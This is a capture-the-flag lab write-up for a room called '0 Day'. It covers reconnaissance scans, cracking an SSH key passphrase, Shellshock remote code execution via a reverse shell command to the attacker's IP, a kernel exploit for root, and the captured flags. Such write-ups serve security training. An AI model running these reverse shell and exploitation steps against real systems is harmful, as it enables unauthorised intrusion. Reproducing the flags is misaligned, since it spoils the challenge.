> 0 Day

## export IP=10.10.94.190

# Nmap

sudo nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
22/tcp open  ssh     syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
```

# Gobuster

sudo gobuster -u http://$IP -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -o gobuster/initial -x txt,php,py,html

```
/index.html (Status: 200)
/cgi-bin (Status: 301) => Looks like our only option
/img (Status: 301)
/uploads (Status: 301)
/admin (Status: 301)
/css (Status: 301)
/js (Status: 301)
/backup (Status: 301) => Has RSA Key
/robots.txt (Status: 200) => Funny ?
/secret (Status: 301) => A turtle image (couldn't find anything)
```

# Cracking SSH using ssh2john

python3 ssh2john.py id_rsa > ssh_john

john ssh_john --wordlist=rockyout.txt

```
letmein          (id_rsa)
```

But we don't have ryan's password.

# Nikto

nikto -h "http://10.10.94.190" | tee nikto.log


```
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /backup/: This might be interesting...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3092: /secret/: This might be interesting...
+ OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ /admin/index.html: Admin login page/section found.
```

We can go through our only option `cgi-bin`. Let's check in gobuster

sudo gobuster -u http://$IP/cgi-bin -w /usr/share/wordlists/DirBuster-Lists/directory-list-2.3-medium.txt -o gobuster/cgi-bin

```
Nil
```

And we come to know we have Shellshock vulnerability.

I searched for shellshock in searchsploit and got one php file for RCE.

php exploit.php -u http://$IP/cgi-bin/test.cgi -c "bash -i >& /dev/tcp/10.8.107.21/1234 0>&1"

And we are in as www-data !!


# user.txt

```
THM{Sh3llSh0ck_r0ckz}
```

# Privilege Escalation

Let's find the version of OS.

uname -a

```
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

It looks pretty old!! Let's search for exploit and we got one. 

When compilin we get an error now looking at the $PATH it is not correct let's change it to default.

`export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`

Now pass the exploit from our machine to remote machine. 

```
gcc priv_esc.c -o ofs
./ofs
```

We are in as root!!

# root.txt

```
THM{g00d_j0b_0day_is_Pleased}
```